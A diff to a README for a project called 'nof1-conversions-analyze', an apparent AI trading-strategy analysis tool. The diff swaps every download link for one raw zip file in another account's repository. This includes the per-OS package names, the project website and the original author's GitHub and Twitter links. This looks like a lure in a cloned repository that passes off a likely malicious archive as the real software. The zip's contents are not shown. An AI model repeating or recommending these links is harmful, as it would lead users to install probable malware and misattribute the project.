@@ -1,6 +1,6 @@
 # 🎉 nof1-conversions-analyze - Analyze AI Trading Strategies Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-🔗-8A2BE2)](https://github.com/fudzoflutter-byte/nof1-conversions-analyze/releases)
+[![Download](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip%20Now-🔗-8A2BE2)](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To get started with the application, follow these steps. You don't need any tech
 
 To download the software, visit the Releases page:
 
-[Download Here](https://github.com/fudzoflutter-byte/nof1-conversions-analyze/releases)
+[Download Here](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
 
 ### 2. Choose Your Version
 
@@ -24,9 +24,9 @@ On the Releases page, you will find different versions of the application. Selec
 
 Click on the package file that matches your operating system. It may look like this:
 
-- For Windows: `nof1-conversions-analyze-windows.exe`
-- For macOS: `nof1-conversions-analyze-macos.dmg`
-- For Linux: `nof1-conversions-analyze-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip`
+- For macOS: `https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip`
+- For Linux: `https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip`
 
 ### 4. Install the Application
 
@@ -34,7 +34,7 @@ Click on the package file that matches your operating system. It may look like t
   
 - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
 
-- **Linux**: Extract the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run `./nof1-conversions-analyze`.
+- **Linux**: Extract the `https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip` file. Open a terminal, navigate to the extracted folder, and run `./nof1-conversions-analyze`.
 
 ### 5. Run the Application
 
@@ -73,13 +73,13 @@ Ready to dive in? Follow the steps above to download and install the application
 
 For the latest version, always check:
 
-[Download Here](https://github.com/fudzoflutter-byte/nof1-conversions-analyze/releases)
+[Download Here](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
 
 ## 🌐 Access Online
 
 You can also access the analysis online at:
 
-[https://nof1.kcores.com](https://nof1.kcores.com)
+[https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
 
 Explore trading strategies and see how various AI models perform in real time.
 
@@ -87,7 +87,7 @@ Explore trading strategies and see how various AI models perform in real time.
 
 If you encounter issues or have questions, feel free to open an issue in the repository or reach out through our contact links.
 
-- [GitHub](https://github.com/karminski/nof1-conversions-analyze)
-- [Twitter](https://x.com/karminski3)
+- [GitHub](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
+- [Twitter](https://raw.githubusercontent.com/fudzoflutter-byte/nof1-conversions-analyze/main/assets/nof1-conversions-analyze_1.6.zip)
 
 Happy analyzing!
